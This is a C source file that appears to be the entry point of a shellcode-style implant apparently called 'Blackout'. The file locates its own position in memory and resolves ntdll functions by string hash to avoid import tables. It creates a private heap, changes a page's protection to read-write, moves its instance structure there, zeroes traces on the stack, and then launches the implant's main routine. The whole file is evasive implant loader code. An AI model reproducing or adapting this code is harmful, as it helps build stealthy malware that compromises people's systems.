#include <common.h>
#include <constexpr.h>

EXTERN_C FUNC VOID Entry(
    PVOID Param
) {
    INSTANCE Instance = { 0 };
    PVOID    MmAddr   = { 0 };
    SIZE_T   MmSize   = { 0 };
    ULONG    Protect  = { 0 };

    MmZero( &Instance, sizeof( Instance ) );

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //
    Instance.Blackout.Region.Base   = StRipStart();
    Instance.Blackout.Region.Length = ( ( U_PTR( StRipEnd() ) - U_PTR( Instance.Blackout.Region.Base ) ) + 4096 - 1 ) & ~( 4096 -1 );
    //
    // get the offset and address of our global instance structure
    //
    MmAddr = Instance.Blackout.Region.Base + InstanceOffset();
    MmSize = sizeof( PVOID );

    Instance.Blackout.RxRegion.Base   = Instance.Blackout.Region.Base;
    Instance.Blackout.RxRegion.Length = U_PTR( MmAddr ) - U_PTR( Instance.Blackout.RxRegion.Base );
    Instance.Blackout.RwRegion.Base   = U_PTR( Instance.Blackout.Region.Base ) - U_PTR( Instance.Blackout.RxRegion.Length );
    Instance.Blackout.RwRegion.Length = U_PTR( Instance.Blackout.Region.Length ) - U_PTR( Instance.Blackout.RxRegion.Length );

    //
    // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
    // updating/patching the Instance in the current memory
    // 
    if ( ( Instance.Modules.Ntdll = LdrModuleAddr( HASH_STR( "ntdll.dll" ) ) ) ) {
        if ( !( Instance.Win32.RtlAllocateHeap        = LdrFuncAddr( Instance.Modules.Ntdll, HASH_STR( "RtlAllocateHeap"        ) ) ) ||
             !( Instance.Win32.NtProtectVirtualMemory = LdrFuncAddr( Instance.Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) ) ||
             !( Instance.Win32.RtlCreateHeap          = LdrFuncAddr( Instance.Modules.Ntdll, HASH_STR( "RtlCreateHeap" ) ) )
        ) {
            return;
        }
    }

    // Create heap for agent
    Instance.Blackout.Heap = Instance.Win32.RtlCreateHeap( 0, NULL, 0, 0, 0, NULL );

    //
    // change the protection of the .global section page to RW
    // to be able to write the allocated instance heap address
    //
    if ( !NT_SUCCESS( Instance.Win32.NtProtectVirtualMemory(
        NtCurrentProcess(),
        &MmAddr,
        &MmSize,
        PAGE_READWRITE,
        & Protect
    ) ) ) {
        return;
    }

    //
    // assign heap address into the RW memory page
    //
    if ( ! ( C_DEF( MmAddr ) = Instance.Win32.RtlAllocateHeap( Instance.Blackout.Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
        return;
    }

    //
    // copy the local instance into the heap,
    // zero out the instance from stack and
    // remove RtRipEnd code/instructions as
    // they are not needed anymore
    //
    MmCopy( C_DEF( MmAddr ), &Instance, sizeof( INSTANCE ) );
    MmZero( &Instance, sizeof( INSTANCE ) );
    MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    //
    // now execute the implant entrypoint
    //
    BlackoutMain( Param );
}